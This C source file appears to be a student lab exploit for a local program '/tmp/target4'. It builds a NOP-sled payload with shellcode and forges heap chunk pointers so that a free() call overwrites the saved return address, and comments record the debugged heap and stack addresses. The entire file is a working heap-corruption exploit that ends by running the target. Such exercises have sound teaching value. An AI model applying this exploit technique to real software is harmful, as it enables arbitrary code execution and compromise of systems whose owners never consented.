#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NULL_TERM 1
#define PAYLOAD_SIZE 1024
#define NOP (0x90)

int main(void)
{

    char *args[3];
    char *env[1];
    char payload[PAYLOAD_SIZE];
    int i,temp, laddr,raddr;
    
    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE-1] = '\0';
    // checked p is ranging from 0x8049c68+1024
    // checked q is 0x8049e68 the difference is 512
    //so q addr is within p alloced range
    // foo is 0xbffffbef

    ///after calling free makes p=q
    // saved register eip at 0xbffffa0c

    memcpy(payload+32,shellcode,strlen(shellcode));
    *(int *)(payload+512-8)=0x08049c68;//left
    *(int *)(payload+512-4)=0xbffffa3c;//right
    *(int *)(payload+4)=-1;//s.r
    *(short *)(payload)=0x0ceb;//right
    

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}









